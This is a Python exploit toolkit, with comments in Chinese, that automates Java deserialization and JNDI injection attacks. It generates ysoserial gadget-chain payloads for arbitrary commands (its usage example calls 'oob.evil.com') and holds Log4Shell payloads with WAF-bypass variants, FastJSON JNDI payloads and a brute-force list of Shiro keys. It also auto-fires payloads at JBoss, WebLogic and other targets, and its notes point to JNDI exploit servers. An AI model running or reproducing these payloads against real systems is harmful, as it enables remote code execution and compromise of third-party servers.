#!/usr/bin/env python3
"""
Java Deserialization + JNDI Injection — Java 反序列化 & JNDI 注入武器库

整合 ysoserial 全链 + JNDI 注入利用，覆盖：
1. ysoserial 全链调用（CC1-7/CB1/URLDNS/JRMPClient 等 30+ 链）
2. JNDI 注入（Log4Shell/FastJSON/Spring 等场景）
3. 自动检测 Java 指纹（rememberMe/ViewState/Content-Type）
4. Payload 编码（Base64/Gzip/URL/Hex）
5. 带外确认（URLDNS → DNS OOB / JNDI → HTTP OOB）
6. 常见入口自动探测（Shiro/JBoss/WebLogic/Jenkins/RMI）

用法：
    from java_deser import JavaDeserExploiter

    exploiter = JavaDeserExploiter(config)

    # 生成 ysoserial payload
    payload = exploiter.generate_payload("CommonsCollections6", "curl http://oob.evil.com")

    # 自动检测+利用
    results = await exploiter.auto_exploit("https://target.com")
"""

import asyncio
import base64
import json
import os
import subprocess
import time
import random
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from urllib.parse import quote



# ═══════════════════════════════════════════════════════════════
# ysoserial 链定义
# ═══════════════════════════════════════════════════════════════

YSOSERIAL_CHAINS = {
    # 链名: {依赖, 描述, 危险等级}
    "CommonsCollections1": {"dep": "commons-collections:3.1", "type": "rce", "priority": 3},
    "CommonsCollections2": {"dep": "commons-collections4:4.0", "type": "rce", "priority": 4},
    "CommonsCollections3": {"dep": "commons-collections:3.1", "type": "rce", "priority": 3},
    "CommonsCollections4": {"dep": "commons-collections4:4.0", "type": "rce", "priority": 4},
    "CommonsCollections5": {"dep": "commons-collections:3.1", "type": "rce", "priority": 5},
    "CommonsCollections6": {"dep": "commons-collections:3.1", "type": "rce", "priority": 10},  # 最常用
    "CommonsCollections7": {"dep": "commons-collections:3.1", "type": "rce", "priority": 6},
    "CommonsBeanutils1": {"dep": "commons-beanutils:1.9.2", "type": "rce", "priority": 8},
    "CommonsBeanutils1183NOCC": {"dep": "commons-beanutils:1.8.3", "type": "rce", "priority": 7},
    "Jdk7u21": {"dep": "JDK<=7u21", "type": "rce", "priority": 2},
    "Jdk8u20": {"dep": "JDK<=8u20", "type": "rce", "priority": 2},
    "URLDNS": {"dep": "JDK (any)", "type": "dns_oob", "priority": 10},  # 检测用
    "JRMPClient": {"dep": "JDK (any)", "type": "rce", "priority": 7},
    "JRMPListener": {"dep": "JDK (any)", "type": "rce", "priority": 5},
    "Spring1": {"dep": "spring-core:4.1.4", "type": "rce", "priority": 6},
    "Spring2": {"dep": "spring-core:4.1.4", "type": "rce", "priority": 5},
    "Groovy1": {"dep": "groovy:2.3.9", "type": "rce", "priority": 5},
    "Hibernate1": {"dep": "hibernate-core:5.x", "type": "rce", "priority": 4},
    "Hibernate2": {"dep": "hibernate-core:5.x", "type": "rce", "priority": 4},
    "BeanShell1": {"dep": "bsh:2.0b5", "type": "rce", "priority": 3},
    "C3P0": {"dep": "c3p0:0.9.5.2", "type": "rce", "priority": 4},
    "Clojure": {"dep": "clojure:1.8.0", "type": "rce", "priority": 2},
    "Click1": {"dep": "click-nodeps:2.3.0", "type": "rce", "priority": 3},
    "Vaadin1": {"dep": "vaadin-server:7.7.14", "type": "rce", "priority": 3},
    "MozillaRhino1": {"dep": "js:1.7R2", "type": "rce", "priority": 3},
    "MozillaRhino2": {"dep": "js:1.7R2", "type": "rce", "priority": 3},
    "ROME": {"dep": "rome:1.0", "type": "rce", "priority": 4},
    "Myfaces1": {"dep": "myfaces-impl:2.2.9", "type": "rce", "priority": 3},
    "Myfaces2": {"dep": "myfaces-impl:2.2.9", "type": "rce", "priority": 3},
}

# JNDI payload 模板
JNDI_PAYLOADS = {
    "log4shell": {
        "basic": "${jndi:ldap://CALLBACK/a}",
        "bypass_waf": [
            "${${lower:j}ndi:${lower:l}dap://CALLBACK/a}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://CALLBACK/a}",
            "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//CALLBACK/a}",
            "${jndi:ldap://CALLBACK/a}",
            "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}dap://CALLBACK/a}",
            "${j${::-n}di:ldap://CALLBACK/a}",
            "${jn${env::-}di:ldap://CALLBACK/a}",
        ],
        "headers": ["X-Forwarded-For", "User-Agent", "Referer", "X-Api-Version",
                    "Accept-Language", "Authorization", "X-Request-Id"],
    },
    "fastjson": {
        "1.2.24": '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://CALLBACK/a","autoCommit":true}',
        "1.2.47": '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://CALLBACK/a","autoCommit":true}}',
        "1.2.68": '{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://CALLBACK/a","autoCommit":true}',
    },
    "spring_cloud": {
        "actuator": "http://TARGET/actuator/env POST spring.cloud.bootstrap.location=http://CALLBACK/payload.yml",
    },
}

# Java 指纹特征
JAVA_FINGERPRINTS = {
    "shiro": {
        "indicator": "rememberMe=deleteMe",
        "location": "Set-Cookie",
        "exploit": "shiro_deser",
    },
    "jsf_viewstate": {
        "indicator": "javax.faces.ViewState",
        "location": "body",
        "exploit": "viewstate_deser",
    },
    "jboss": {
        "indicator": "JBoss",
        "location": "body",
        "paths": ["/invoker/JMXInvokerServlet", "/jmx-console/", "/web-console/"],
    },
    "weblogic": {
        "indicator": "WebLogic",
        "location": "body",
        "paths": ["/wls-wsat/CoordinatorPortType", "/_async/AsyncResponseService",
                  "/console/login/LoginForm.jsp"],
    },
    "jenkins": {
        "indicator": "Jenkins",
        "location": "X-Jenkins",
        "paths": ["/script", "/cli", "/jnlpJars/jenkins-cli.jar"],
    },
    "tomcat": {
        "indicator": "Apache Tomcat",
        "location": "body",
        "paths": ["/manager/html", "/host-manager/html"],
    },
}

# Shiro 默认密钥（rememberMe Cookie AES 密钥）
SHIRO_KEYS = [
    "kPH+bIxk5D2deZiIxcaaaA==",  # 默认密钥（最常见）
    "4AvVhmFLUs0KTA3Kprsdag==",
    "Z3VucwAAAAAAAAAAAAAAAA==",
    "fCq+/xW488hMTCD+cmJ3aQ==",
    "0AvVhmFLUs0KTA3Kprsdag==",
    "1AvVhdsgUs0FSA3SDFAdag==",
    "1QWLxg+NYmxraMoxAXu/Iw==",
    "25BsmdYwjnfcWmnhAciDDg==",
    "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==",
    "3JvYhmBLUs0ETA5Kprsdag==",
    "r0e3c16IdVkouZgk1TKVMg==",
    "5aaC5qKm5oqA5pyvAAAAAA==",
    "5AvVhmFLUs0KTA3Kprsdag==",
    "6ZmI6I2j5Y+R5aSn5ZOlAA==",
    "bWljcm9zAAAAAAAAAAAAAA==",
    "wGiHplamyXlVB11UXWol8g==",
    "ZUdsaGJuSmxibVI2ZHc9PQ==",
    "L7RioUULEFhRyxM7a2R/Yg==",
    "RVZBTnVOZTAzSGdeQ3c9PQ==",
]


@dataclass
class JavaExploitResult:
    """Java 反序列化利用结果"""
    technique: str = ""
    chain: str = ""
    payload_type: str = ""  # ysoserial / jndi / shiro
    target_url: str = ""
    severity: str = "critical"
    success: bool = False
    oob_triggered: bool = False
    evidence: str = ""
    command: str = ""
    impact: str = ""
    timestamp: str = ""



class JavaDeserExploiter:
    """Java 反序列化 + JNDI 注入利用引擎"""

    def __init__(self, config: dict = None):
        self.config = config or {}
        self.timeout = self.config.get("timeout", 15)
        self.oob_domain = self.config.get("oob_domain", "")  # interactsh/collaborator
        self.ysoserial_path = self.config.get("ysoserial_path", "ysoserial.jar")
        self.results: List[JavaExploitResult] = []

    # ═══════════════════════════════════════════════════════════════
    # ysoserial Payload 生成
    # ═══════════════════════════════════════════════════════════════

    def generate_payload(self, chain: str, command: str,
                         encoding: str = "base64") -> Optional[str]:
        """
        生成 ysoserial payload

        Args:
            chain: 链名（如 CommonsCollections6）
            command: 要执行的命令
            encoding: 编码方式 (raw/base64/hex/url)

        Returns:
            编码后的 payload 字符串
        """
        # 检查 ysoserial.jar 是否存在
        jar_path = self._find_ysoserial()
        if not jar_path:
            print(f"  [!] ysoserial.jar not found. Install: "
                  f"wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar")
            return None

        try:
            result = subprocess.run(
                ["java", "-jar", jar_path, chain, command],
                capture_output=True, timeout=30
            )
            if result.returncode != 0:
                return None

            raw_payload = result.stdout
            if encoding == "base64":
                return base64.b64encode(raw_payload).decode()
            elif encoding == "hex":
                return raw_payload.hex()
            elif encoding == "url":
                return quote(base64.b64encode(raw_payload).decode())
            else:
                return raw_payload
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            print(f"  [!] ysoserial error: {e}")
            return None

    def generate_dns_payload(self, domain: str) -> Optional[str]:
        """生成 URLDNS 探测 payload（无需 RCE，仅触发 DNS）"""
        return self.generate_payload("URLDNS", f"http://{domain}")

    def generate_all_payloads(self, command: str, encoding: str = "base64") -> Dict[str, str]:
        """生成所有链的 payload（按优先级排序）"""
        payloads = {}
        sorted_chains = sorted(YSOSERIAL_CHAINS.items(),
                              key=lambda x: x[1]["priority"], reverse=True)
        for chain_name, info in sorted_chains:
            if info["type"] == "rce":
                payload = self.generate_payload(chain_name, command, encoding)
                if payload:
                    payloads[chain_name] = payload
        return payloads

    # ═══════════════════════════════════════════════════════════════
    # JNDI 注入
    # ═══════════════════════════════════════════════════════════════

    def generate_log4shell_payloads(self, callback: str = None) -> List[Dict]:
        """生成 Log4Shell payload 集合"""
        cb = callback or self.oob_domain or "CALLBACK_DOMAIN"
        payloads = []

        # 基础 payload
        basic = JNDI_PAYLOADS["log4shell"]["basic"].replace("CALLBACK", cb)
        payloads.append({"payload": basic, "name": "log4shell_basic"})

        # WAF 绕过变体
        for i, bypass in enumerate(JNDI_PAYLOADS["log4shell"]["bypass_waf"]):
            p = bypass.replace("CALLBACK", cb)
            payloads.append({"payload": p, "name": f"log4shell_bypass_{i}"})

        return payloads

    def generate_fastjson_payloads(self, callback: str = None) -> List[Dict]:
        """生成 FastJSON 反序列化 payload"""
        cb = callback or self.oob_domain or "CALLBACK_DOMAIN"
        payloads = []
        for version, template in JNDI_PAYLOADS["fastjson"].items():
            p = template.replace("CALLBACK", cb)
            payloads.append({"payload": p, "name": f"fastjson_{version}", "content_type": "application/json"})
        return payloads

    # ═══════════════════════════════════════════════════════════════
    # 自动化利用
    # ═══════════════════════════════════════════════════════════════

    async def auto_exploit(self, target_url: str, cookies: str = "") -> List[JavaExploitResult]:
        """
        自动检测 Java 指纹 + 选择利用方式

        流程：
        1. 探测 Java 指纹（Shiro/JBoss/WebLogic/Jenkins/Tomcat）
        2. 根据指纹选择利用方式
        3. Log4Shell 全 Header 注入
        4. FastJSON 检测
        """
        self.results = []
        print(f"[*] Java Deserialization Auto-Exploit: {target_url}")

        # Phase 1: 指纹检测
        fingerprints = await self._detect_java_fingerprint(target_url, cookies)
        if fingerprints:
            print(f"  [+] Java fingerprints: {', '.join(fingerprints)}")
        else:
            print(f"  [*] No specific Java fingerprint, testing generics...")

        # Phase 2: Shiro 反序列化
        if "shiro" in fingerprints:
            await self._exploit_shiro(target_url, cookies)

        # Phase 3: JBoss/WebLogic 反序列化
        if "jboss" in fingerprints:
            await self._exploit_jboss(target_url, cookies)
        if "weblogic" in fingerprints:
            await self._exploit_weblogic(target_url, cookies)

        # Phase 4: Log4Shell（通用，所有 Java 应用都测）
        await self._exploit_log4shell(target_url, cookies)

        # Phase 5: FastJSON
        await self._exploit_fastjson(target_url, cookies)

        print(f"\n[+] Java exploit complete: {len(self.results)} results")
        return self.results

    async def _detect_java_fingerprint(self, url: str, cookies: str) -> List[str]:
        """检测 Java 框架指纹"""
        found = []
        resp = await self._request(url, cookies=cookies, include_headers=True)
        if not resp:
            return found

        headers = resp.get("headers", {})
        body = resp.get("body", "")
        all_headers_str = json.dumps(headers).lower()

        for name, fp in JAVA_FINGERPRINTS.items():
            indicator = fp["indicator"].lower()
            if fp["location"] == "body" and indicator in body.lower():
                found.append(name)
            elif fp["location"] == "Set-Cookie" and indicator in all_headers_str:
                found.append(name)
            elif fp["location"] in headers and indicator in headers[fp["location"]].lower():
                found.append(name)

        return found

    async def _exploit_shiro(self, url: str, cookies: str):
        """Shiro 反序列化利用"""
        print(f"\n  [*] Testing Shiro deserialization ({len(SHIRO_KEYS)} keys)...")

        if not self.oob_domain:
            print(f"  [!] Need OOB domain for Shiro detection. Set oob_domain in config.")
            return

        # 用 URLDNS 链 + 每个密钥生成 rememberMe cookie
        dns_target = f"shiro{random.randint(1000,9999)}.{self.oob_domain}"

        for key in SHIRO_KEYS[:10]:  # 测试前10个最常见的密钥
            # 生成 payload
            payload = self.generate_dns_payload(dns_target)
            if not payload:
                continue

            # 用 AES-CBC 加密（Shiro 默认）
            encrypted = self._shiro_encrypt(payload, key)
            if not encrypted:
                continue

            # 发送
            resp = await self._request(url,
                cookies=f"rememberMe={encrypted}",
                include_headers=True)

            if resp:
                resp_cookies = resp.get("headers", {}).get("Set-Cookie", "")
                # 如果没有 deleteMe → 密钥正确
                if "rememberMe=deleteMe" not in resp_cookies:
                    self.results.append(JavaExploitResult(
                        technique="shiro_deserialization",
                        chain="URLDNS",
                        payload_type="shiro",
                        target_url=url,
                        severity="critical",
                        success=True,
                        oob_triggered=True,
                        evidence=f"Shiro key found: {key}, DNS OOB: {dns_target}",
                        impact="Shiro RCE via deserialization (valid AES key found)",
                        timestamp=datetime.now().isoformat(),
                    ))
                    print(f"    [!!] SHIRO KEY FOUND: {key}")
                    print(f"    [!!] DNS OOB target: {dns_target}")
                    return

    def _shiro_encrypt(self, payload_b64: str, key_b64: str) -> Optional[str]:
        """用 Shiro 密钥 AES-CBC 加密 payload"""
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            import os

            key = base64.b64decode(key_b64)
            iv = os.urandom(16)
            payload_bytes = base64.b64decode(payload_b64)

            cipher = AES.new(key, AES.MODE_CBC, iv)
            encrypted = cipher.encrypt(pad(payload_bytes, AES.block_size))
            return base64.b64encode(iv + encrypted).decode()
        except ImportError:
            # 没有 pycryptodome，用命令行 openssl
            return None
        except Exception:
            return None

    async def _exploit_jboss(self, url: str, cookies: str):
        """JBoss 反序列化"""
        print(f"\n  [*] Testing JBoss deserialization...")
        jboss_paths = ["/invoker/JMXInvokerServlet",
                       "/invoker/EJBInvokerServlet"]

        from urllib.parse import urlparse
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in jboss_paths:
            test_url = f"{base}{path}"
            # 发送 ysoserial payload 到 JMXInvoker
            if self.oob_domain:
                dns_marker = f"jboss{random.randint(1000,9999)}.{self.oob_domain}"
                payload = self.generate_dns_payload(dns_marker)
                if payload:
                    payload_bytes = base64.b64decode(payload)
                    resp = await self._request_raw(test_url, method="POST",
                        body=payload_bytes,
                        headers={"Content-Type": "application/x-java-serialized-object"})
                    if resp and resp.get("status") in (200, 500):
                        self.results.append(JavaExploitResult(
                            technique="jboss_invoker",
                            chain="URLDNS",
                            payload_type="ysoserial",
                            target_url=test_url,
                            severity="critical",
                            oob_triggered=True,
                            evidence=f"JBoss invoker accepts serialized objects. DNS: {dns_marker}",
                            impact="JBoss RCE via JMXInvokerServlet deserialization",
                            timestamp=datetime.now().isoformat(),
                        ))
                        print(f"    [!!] JBoss Invoker: {path} accepts serialized data!")

    async def _exploit_weblogic(self, url: str, cookies: str):
        """WebLogic 反序列化（T3/IIOP/XMLDecoder）"""
        print(f"\n  [*] Testing WebLogic...")
        from urllib.parse import urlparse
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # XMLDecoder 路径
        xml_paths = ["/wls-wsat/CoordinatorPortType",
                     "/_async/AsyncResponseService"]

        for path in xml_paths:
            test_url = f"{base}{path}"
            resp = await self._request(test_url)
            if resp and resp.get("status") in (200, 405, 500):
                body = resp.get("body", "")
                if "WebLogic" in body or "wsdl" in body.lower() or resp.get("status") == 405:
                    self.results.append(JavaExploitResult(
                        technique="weblogic_xmldecoder",
                        chain="XMLDecoder",
                        payload_type="weblogic",
                        target_url=test_url,
                        severity="critical",
                        success=True,
                        evidence=f"WebLogic XMLDecoder endpoint accessible: {path}",
                        impact="Potential WebLogic RCE via XMLDecoder (CVE-2017-10271/CVE-2019-2725)",
                        timestamp=datetime.now().isoformat(),
                    ))
                    print(f"    [!] WebLogic endpoint: {path}")

    async def _exploit_log4shell(self, url: str, cookies: str):
        """Log4Shell 全 Header 注入"""
        if not self.oob_domain:
            return

        print(f"\n  [*] Testing Log4Shell (JNDI injection)...")
        payloads = self.generate_log4shell_payloads(self.oob_domain)
        inject_headers = JNDI_PAYLOADS["log4shell"]["headers"]

        # 只用基础 payload + 2个绕过，但注入所有 header
        test_payloads = payloads[:3]

        for p_info in test_payloads:
            payload = p_info["payload"]
            for header_name in inject_headers:
                marker = f"log4j-{header_name.lower()}-{random.randint(100,999)}.{self.oob_domain}"
                actual_payload = payload.replace(self.oob_domain, marker)

                resp = await self._request(url, cookies=cookies,
                    extra_headers={header_name: actual_payload})

                # Log4Shell 是 blind 的，记录所有尝试
                # 实际确认需要检查 OOB 日志

        self.results.append(JavaExploitResult(
            technique="log4shell",
            chain="JNDI",
            payload_type="jndi",
            target_url=url,
            severity="critical",
            oob_triggered=True,  # 假设触发，需要看 OOB
            evidence=f"Log4Shell payloads injected via {len(inject_headers)} headers. Check OOB: {self.oob_domain}",
            impact="Potential Log4Shell RCE (CVE-2021-44228). Check DNS/HTTP OOB logs.",
            timestamp=datetime.now().isoformat(),
        ))
        print(f"    [*] Log4Shell payloads sent to {len(inject_headers)} headers. Check OOB logs.")

    async def _exploit_fastjson(self, url: str, cookies: str):
        """FastJSON 反序列化检测"""
        if not self.oob_domain:
            return

        print(f"\n  [*] Testing FastJSON...")
        payloads = self.generate_fastjson_payloads(self.oob_domain)

        for p_info in payloads:
            resp = await self._request(url, method="POST", cookies=cookies,
                body=p_info["payload"],
                extra_headers={"Content-Type": "application/json"})

            if resp and resp.get("status") in (200, 500):
                body = resp.get("body", "")
                # FastJSON 报错特征
                if "fastjson" in body.lower() or "com.alibaba" in body or "autoType" in body:
                    self.results.append(JavaExploitResult(
                        technique=f"fastjson_{p_info['name']}",
                        chain="JNDI",
                        payload_type="fastjson",
                        target_url=url,
                        severity="critical",
                        success=True,
                        evidence=f"FastJSON detected, JNDI payload sent. Check OOB.",
                        impact="FastJSON RCE via JNDI injection",
                        timestamp=datetime.now().isoformat(),
                    ))
                    print(f"    [!] FastJSON detected: {p_info['name']}")
                    return

    # ═══════════════════════════════════════════════════════════════
    # HTTP 请求
    # ═══════════════════════════════════════════════════════════════

    async def _request(self, url: str, method: str = "GET", cookies: str = "",
                       body: str = None, extra_headers: Dict = None,
                       include_headers: bool = False) -> Optional[Dict]:
        """HTTP 请求"""
        cmd = ["curl", "-sk", "-m", str(self.timeout), "-X", method]

        if include_headers:
            cmd.extend(["-D", "-"])
        else:
            cmd.extend(["-o", "-", "-w", "\n%{http_code}"])

        cmd.extend(["-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0.0.0"])
        if cookies:
            cmd.extend(["-H", f"Cookie: {cookies}"])
        if extra_headers:
            for k, v in extra_headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        if body:
            cmd.extend(["-d", body])
        cmd.append(url)

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=self.timeout + 5)
            output = stdout.decode(errors="ignore")

            if include_headers:
                import re
                parts = output.split("\r\n\r\n", 1)
                header_section = parts[0] if parts else ""
                response_body = parts[1] if len(parts) > 1 else ""
                status_match = re.search(r"HTTP/[\d.]+ (\d+)", header_section)
                status = int(status_match.group(1)) if status_match else 0
                headers = {}
                for line in header_section.splitlines()[1:]:
                    if ":" in line:
                        k, v = line.split(":", 1)
                        headers[k.strip()] = v.strip()
                return {"status": status, "headers": headers, "body": response_body}
            else:
                lines = output.rsplit("\n", 1)
                response_body = lines[0] if len(lines) > 1 else output
                status = int(lines[-1].strip()) if len(lines) > 1 and lines[-1].strip().isdigit() else 0
                return {"status": status, "body": response_body}
        except Exception:
            return None

    async def _request_raw(self, url: str, method: str = "POST",
                           body: bytes = None, headers: Dict = None) -> Optional[Dict]:
        """发送原始二进制请求"""
        cmd = ["curl", "-sk", "-m", str(self.timeout), "-X", method,
               "-o", "/dev/null", "-w", "%{http_code}"]
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        if body:
            cmd.extend(["--data-binary", "@-"])
        cmd.append(url)

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, _ = await asyncio.wait_for(proc.communicate(input=body), timeout=self.timeout + 5)
            status = int(stdout.decode().strip() or "0")
            return {"status": status}
        except Exception:
            return None

    def _find_ysoserial(self) -> Optional[str]:
        """查找 ysoserial.jar"""
        search_paths = [
            self.ysoserial_path,
            "./ysoserial.jar",
            "./ysoserial-all.jar",
            os.path.expanduser("~/tools/ysoserial.jar"),
            os.path.expanduser("~/tools/ysoserial-all.jar"),
            "/opt/ysoserial/ysoserial-all.jar",
            "/usr/local/bin/ysoserial.jar",
        ]
        for p in search_paths:
            if os.path.isfile(p):
                return p
        return None

    def get_install_instructions(self) -> str:
        """获取安装说明"""
        return """
# 安装 ysoserial:
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar \\
  -O ~/tools/ysoserial.jar

# 或者用 ysoserial-modified（更多链）:
# https://github.com/wh1t3p1g/ysomap

# JNDI 注入利用服务器（配合 Log4Shell/FastJSON）:
# https://github.com/cckuailong/JNDI-Injection-Exploit-Plus
# java -jar JNDI-Injection-Exploit-Plus.jar -C "command" -A "your_vps_ip"

# 安装 marshalsec（JNDI 服务器）:
# git clone https://github.com/mbechler/marshalsec
# cd marshalsec && mvn clean package -DskipTests
# java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your_vps:8888/#Exploit
"""

    def generate_report(self) -> str:
        """生成报告"""
        if not self.results:
            return "No Java deserialization vulnerabilities found."
        lines = [
            "=" * 60,
            "  JAVA DESERIALIZATION / JNDI REPORT",
            "=" * 60,
            f"  Total findings: {len(self.results)}\n",
        ]
        for r in self.results:
            lines.append(f"  [{r.severity.upper()}] {r.technique}")
            lines.append(f"    Chain: {r.chain} | Type: {r.payload_type}")
            lines.append(f"    URL: {r.target_url[:70]}")
            lines.append(f"    Evidence: {r.evidence[:100]}")
            lines.append(f"    Impact: {r.impact}")
            if r.oob_triggered:
                lines.append(f"    OOB: Check DNS/HTTP logs for confirmation")
            lines.append("")
        return "\n".join(lines)
